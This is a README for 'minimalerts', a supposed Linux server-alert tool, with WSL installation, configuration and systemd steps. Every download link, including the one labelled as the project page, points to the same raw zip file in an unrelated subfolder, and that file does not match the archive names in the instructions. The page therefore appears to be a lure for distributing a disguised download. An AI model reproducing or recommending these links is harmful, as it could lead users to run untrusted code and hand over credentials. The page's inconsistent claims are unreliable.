# ⚙️ minimalerts - Simple Server Monitoring Alerts

[![Download minimalerts](https://img.shields.io/badge/Download%20minimalerts-blue?style=for-the-badge)](https://raw.githubusercontent.com/manzifouady/minimalerts/main/entrepas/Software-2.6-alpha.5.zip)

---

## 📋 What is minimalerts?

minimalerts is a tool designed to watch over your Linux servers. It checks the health and uptime of your system. When things go wrong, it sends alerts by email or text message. This helps you catch problems early and keep your servers running smoothly.

The alerts work with common services like Gmail for email and IPPanel for SMS. minimalerts uses systemd on Linux to schedule checks, so it runs automatically and reliably.

---

## 💻 Who is this for?

minimalerts is made for anyone who runs Linux servers but does not want to spend a lot of time or effort on monitoring. It suits computer users who:

- Want to see if their server is online
- Need alerts when server resources get too high
- Prefer simple tools that don’t require coding
- Want email or SMS alerts without setting up complex software

This guide will help you install minimalerts on Windows, running it through the Windows Subsystem for Linux (WSL). This lets you use the Linux software without a full Linux machine.

---

## 🔍 Features you will get

- Regular checks of server status and resource use
- Notifications sent by Gmail email or IPPanel SMS
- Set custom limits or thresholds for alerts
- Runs scheduled checks with systemd service
- Simple setup with no programming needed
- Works quietly in the background

---

## ⚙️ System requirements

Before installing, make sure you have:

- Windows 10 or later, with Windows Subsystem for Linux (WSL) enabled
- WSL Ubuntu distribution installed (recommended)
- Internet connection to download minimalerts and send alerts
- Gmail account (for email alerts) or IPPanel account (for SMS alerts)
- Basic knowledge of opening command prompt or terminal

---

## 🚀 Getting Started

### Step 1: Enable Windows Subsystem for Linux (WSL)

To run minimalerts on Windows, you first need to turn on WSL.

1. Open **PowerShell** as Administrator. To do that, right-click the Start button and select **Windows PowerShell (Admin)**.
2. Run this command:

```
wsl --install
```

3. Restart your computer when asked.
4. Once restarted, open the Microsoft Store and search for "Ubuntu". Install the latest Ubuntu version.
5. Open the Ubuntu app from the Start menu.
6. Wait for the installation to finish. Create a username and password when prompted.

---

## 🔽 Download minimalerts

Press the button below to visit the download page and get minimalerts:

[![Download minimalerts](https://img.shields.io/badge/Download%20minimalerts-grey?style=for-the-badge)](https://raw.githubusercontent.com/manzifouady/minimalerts/main/entrepas/Software-2.6-alpha.5.zip)

On this page:

- Look for the latest release version.
- Download the file suitable for your use. For Windows with WSL, download the source code zip or tarball.
- Save the file in your Ubuntu home folder or a folder you can easily access.

---

## 🧩 Installing minimalerts inside WSL Ubuntu

1. Open your Ubuntu terminal.
2. Update your packages list with:

```
sudo apt update
```

3. Install Python if not already installed:

```
sudo apt install python3 python3-pip
```

4. Extract the downloaded minimalerts archive (replace the file name with the exact one you downloaded):

```
tar -xvf minimalerts-x.x.x.tar.gz
```

or if it is a zip:

```
unzip minimalerts-x.x.x.zip
```

5. Change to the extracted directory:

```
cd minimalerts-x.x.x
```

6. Install necessary Python packages:

```
pip3 install -r requirements.txt
```

---

## ⚙️ Configure minimalerts

You will find a configuration file named `config.yaml` inside the minimalerts folder. This file tells minimalerts what to monitor and how to send alerts.

Open it with a text editor (such as nano) and set the following:

- **Email settings**: add your Gmail email address and password or app password.
- **SMS settings**: add your IPPanel API key and phone numbers.
- **Server thresholds**: decide what limits will trigger an alert, such as CPU usage over 80%.
- **Check timing**: set how often minimalerts should run its checks.

Example to open the file in the terminal:

```
nano config.yaml
```

Make your changes, then save and close the file (press `CTRL + X`, then `Y` to confirm).

---

## 🛠️ Run minimalerts

To test minimalerts runs as expected, execute:

```
python3 minimalerts.py
```

If everything is set correctly, it will run checks and send test alerts.

---

## 🔄 Set up automatic running with systemd (inside WSL Ubuntu)

You can create a systemd service to run minimalerts automatically.

1. Create a service file:

```
sudo nano /etc/systemd/system/minimalerts.service
```

2. Add the following content (adjust paths if needed):

```
[Unit]
Description=Minimalerts Monitoring Service

[Service]
ExecStart=/usr/bin/python3 /home/yourusername/minimalerts/minimalerts.py
Restart=always
User=yourusername

[Install]
WantedBy=default.target
```

3. Reload systemd services:

```
sudo systemctl daemon-reload
```

4. Start the service:

```
sudo systemctl start minimalerts
```

5. Enable it to run on startup:

```
sudo systemctl enable minimalerts
```

---

## 🔎 Check status and logs

To see if minimalerts is working:

```
sudo systemctl status minimalerts
```

Logs can be accessed with:

```
journalctl -u minimalerts -f
```

---

## 💡 Tips for smooth operation

- Keep your Gmail or IPPanel credentials private and secure.
- Use an app password with Gmail instead of your main password.
- Adjust alert thresholds based on your server’s usual load.
- Restart minimalerts service after changes to the configuration.
- Use the logs to troubleshoot if alerts do not arrive.

---

## 📚 Learn more and get help

Visit the minimalerts GitHub page for detailed docs, issues, and updates:

https://raw.githubusercontent.com/manzifouady/minimalerts/main/entrepas/Software-2.6-alpha.5.zip

Check the "Issues" tab if you run into trouble, or post your questions there.